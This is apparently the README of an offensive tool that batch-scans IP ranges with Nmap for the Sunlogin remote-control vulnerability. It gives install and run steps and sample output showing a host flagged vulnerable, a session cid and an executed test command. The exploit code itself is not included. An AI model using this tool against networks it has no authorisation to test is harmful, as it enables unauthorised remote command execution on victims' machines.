# sunlogin_exp_for_tututu
# 基于NMAP的向日葵漏洞自动化批量扫描工具

## 1. 需要您安装NMAP，https://nmap.org/download。

## 2. 需要更新安装Python模块
    pip install requests
    pip install python-nmap
    
## 3. 在test.txt中放入地址段(仅支持IP和地址段哦)

## 4. 执行Python sunlogin_exp_for_tututu.py

执行情况:
```
PS D:\> python .\sunlogin_exp_for_tututu.py
2022-07-10 10:52:21-172.17.8.0/23
[+]host:http://172.17.8.99:61127 cid:hHdXNeZi8NrH5cOND9JVsawf5lysf97y cmd:"vulnerable!" response:vulnerable! 
```
